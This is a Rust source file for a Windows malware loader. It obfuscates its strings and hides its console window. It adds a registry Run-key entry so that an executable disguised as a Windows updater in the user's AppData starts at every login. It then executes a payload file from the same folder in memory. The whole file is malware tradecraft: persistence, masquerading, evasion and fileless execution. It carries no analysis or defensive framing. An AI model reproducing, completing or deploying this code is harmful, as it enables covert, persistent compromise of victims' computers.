#![windows_subsystem = "windows"]
use std::path::Path;
use obfstr::obfstr;
use std::process::Command;
use crate::exec_mem::exec_mem;
use std::env;
use std::os::windows::process::CommandExt;

#[cfg(target_os = "windows")]
const CREATE_NO_WINDOW: u32 = 0x08000000;


pub struct Loader 
{
    pub var : String,
}

impl Loader 
{
    pub fn configurate_rg()
    {
        let username = env::var("USERNAME").unwrap_or_else(|_| "Default".to_string());
        let ruta = format!(
            "{}{}{}",
            obfstr!(r"C:\Users\"),
            username,
            obfstr!(r"\AppData\WindowsUpdater\update.exe")
        );
        let local = Command::new(obfstr!("reg"))
            .args([
                obfstr!("add"),
                obfstr!(r"HKCU\Software\Microsoft\Windows \CurrentVersion\Run"),
                obfstr!("/v"),
                obfstr!("WindowsaUpdaterdd"),
                obfstr!("/t"), 
                obfstr!("REG_SZ"),
                obfstr!("/d"),
                &ruta,
                obfstr!("/f"),              
            ])
            .creation_flags(CREATE_NO_WINDOW)
            .status();
        match local {
            Ok(status) => {

            }
            Err(e) => {

            }
        }

    }
    
    pub fn terminator()
    {
        let username = env::var("USERNAME").unwrap_or_else(|_| "Default".to_string());
        let ruta = format!(
            "{}{}{}",
            obfstr!(r"C:\Users\"),
            username,
            obfstr!(r"\AppData\WindowsUpdater\SfbsASxSd.bin")
        );
        let _ = exec_mem(Path::new(&ruta));

    }
}